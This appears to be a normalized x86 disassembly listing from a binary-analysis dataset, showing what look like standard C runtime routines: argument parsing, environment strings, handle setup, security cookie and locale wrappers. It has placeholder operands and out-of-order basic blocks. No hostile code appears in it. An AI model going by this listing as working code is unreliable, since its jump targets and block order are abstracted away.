jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_418d0d
pop ecx
test eax eax
je r-xdata
call sub_418d0d
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_417424
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_4160e5
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_41728a
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_41542c
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_41728a
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_4174df
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
call [ GetEnvironmentStringsW@IAT ]
mov ebx eax
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebx ] si
je r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
push esi
sub eax ebx
push esi
sar eax 0x1
inc eax
push eax
push ebx
push esi
push esi
mov [ ebp - 0xc ] eax
call edi
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
pop esi
pop ebx
leave
retn
push ebx
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
push eax
call sub_41542c
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
push esi
push esi
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push ebx
push esi
push esi
call edi
test eax eax
jne r-xdata
push ebx
call [ FreeEnvironmentStringsW@IAT ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_4152db
pop ecx
mov [ ebp - 0x4 ] esi
pop edi
sub_417576
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
push esi
lea eax [ ebp - 0x4c ]
push eax
call [ GetStartupInfoW@IAT ]
push 0x40
push 0x20
pop esi
push esi
call sub_415471
pop ecx
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
lea edx [ eax + 0x800 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
cmp eax edx
jae r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
cmp [ ebp - 0x1a ] cx
je r-xdata
add eax 0x5
pop esi
leave
retn
xor ebx ebx
mov eax [ ebp - 0x18 ]
cmp eax ecx
je r-xdata
or [ eax - 0x5 ] 0xffffffff
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x3 ] ecx
mov [ eax + 0x1f ] 0xa00
mov [ eax + 0x21 ] 0xa
mov [ eax + 0x33 ] ecx
mov [ eax + 0x2f ] cl
mov esi [ rw-data ]
add eax 0x40
lea edx [ eax - 0x5 ]
add esi 0x800
cmp edx esi
jb r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x4 ] eax
add eax ebx
mov esi 0x800
mov [ ebp - 0x8 ] eax
cmp ebx esi
jl r-xdata
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
cmp [ rw-data ] ebx
jge r-xdata
mov ebx esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
xor edi edi
test ebx ebx
jle r-xdata
mov edi rw-data
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0xffffffff
je r-xdata
mov ebx [ rw-data ]
add [ rw-data ] 0x20
lea ecx [ eax + 0x800 ]
mov [ edi ] eax
cmp eax ecx
jae r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
add [ ebp - 0x8 ] 0x4
inc edi
inc [ ebp - 0x4 ]
cmp edi ebx
jl r-xdata
cmp eax 0xfffffffe
je r-xdata
add edi 0x4
cmp [ rw-data ] ebx
jl r-xdata
add eax 0x5
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov cl [ ecx ]
test cl 0x1
je r-xdata
push 0x40
push 0x20
call sub_415471
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
or [ eax - 0x5 ] 0xffffffff
and [ eax + 0x3 ] 0x0
and [ eax + 0x1f ] 0x80
and [ eax + 0x33 ] 0x0
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x20 ] 0xa0a
mov [ eax + 0x2f ] 0x0
mov ecx [ edi ]
add eax 0x40
add ecx esi
lea edx [ eax - 0x5 ]
cmp edx ecx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
test cl 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ esi + 0x8 ]
jmp r-xdata
mov esi edi
and esi 0x1f
mov eax edi
sar eax 0x5
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
pop edi
pop ebx
inc [ esi + 0x8 ]
sub_4177bb
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_4177e1
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_417825
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
or eax 0x4711
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_4178c0
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_41790a
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_4152db
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_417978
push 0xc
push r--data
call sub_415830
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_416fcc
push 0x1e
call sub_416e1d
push 0xff
call sub_415569
push 0x18
call sub_41542c
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_417a3a
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_416d94
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_415875
retn
push edi
call sub_4152db
pop ecx
push 0xfa0
push edi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_4152db
pop ecx
call sub_416d94
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417a31
mov eax [ ebp - 0x1c ]
sub_417a3a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_417978
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_41580b
sub_417a6d
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
imul ecx [ ebp + 0xc ]
push esi
mov esi ecx
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_416d94
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push esi
call sub_4153b8
pop ecx
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov [ ecx ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
sub_417aef
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_415315
pop ecx
pop ebp
retn
push edi
jmp r-xdata
push [ ebp + 0x8 ]
call sub_4152db
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_4153b8
pop ecx
call sub_416d94
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop edi
call sub_416d94
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_416d52
pop ecx
mov [ esi ] eax
push esi
call sub_4153b8
pop ecx
test eax eax
je r-xdata
call sub_416d94
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_416d52
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_417bba
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_417bfe
push 0x20
push r--data
call sub_415830
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_416573
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_415875
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_417bba
pop ecx
lea esi [ eax + 0x8 ]
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_4157d7
mov [ ebp - 0x1c ] 0x1
push eax
call [ DecodePointer@IAT ]
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_416d94
mov [ eax ] 0x16
call sub_416d42
jmp r-xdata
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_417a3a
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_41643c
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417d65
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ r--data ]
add ecx [ r--data ]
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_417dbf
mov edi edi
push esi
push edi
xor edi edi
push [ edi + rw-data ]
call [ EncodePointer@IAT ]
mov [ edi + rw-data ] eax
add edi 0x4
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_417df0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_417e30
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_417e80
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_415890
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_417df0
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_417e30
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417f50
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_417fe0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_418f55
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_418f74
jmp r-xdata
sub_417fe0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_417f3c
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_417f50
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_418042
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_418072
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4180a2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_4152db
pop ecx
sub_4180c2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x18 ]
push ebx
xor ebx ebx
push esi
push edi
cmp edx ebx
jle r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx edx
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x28 ] ebx
push ebx
push ebx
push [ ebp + 0x18 ]
setne al
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x24 ]
call esi
mov edi eax
mov [ ebp - 0x10 ] edi
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov eax edx
sub eax ecx
dec eax
cmp eax edx
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x18 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_417f3c
leave
retn
push edi
push [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp - 0xc ]
call sub_4180a2
mov eax [ ebp - 0x8 ]
pop ecx
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push eax
call sub_415315
pop ecx
cmp eax ebx
je r-xdata
call sub_418f80
mov eax esp
cmp eax ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi ebx
jle r-xdata
mov eax [ ebp + 0x20 ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x1c ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
jmp r-xdata
push edi
call sub_4180a2
pop ecx
push ebx
push ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
push eax
call sub_415315
pop ecx
cmp eax ebx
je r-xdata
call sub_418f80
mov edi esp
cmp edi ebx
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push ebx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push edi
push ebx
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp edi ebx
je r-xdata
sub_4182a9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_4135f1
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_4180c2
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_4182ef
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x1c ]
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
jle r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_417f3c
leave
retn
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_4130d0
add esp 0xc
push edi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_4180a2
mov eax [ ebp - 0x8 ]
pop ecx
push [ ebp + 0x18 ]
push eax
push ebx
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_415315
pop ecx
cmp eax ebx
je r-xdata
call sub_418f80
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_4183d6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_4135f1
push [ ebp + 0x24 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_4182ef
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_418416
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_4152db
push [ esi + 0x8 ]
call sub_4152db
push [ esi + 0xc ]
call sub_4152db
push [ esi + 0x10 ]
call sub_4152db
push [ esi + 0x14 ]
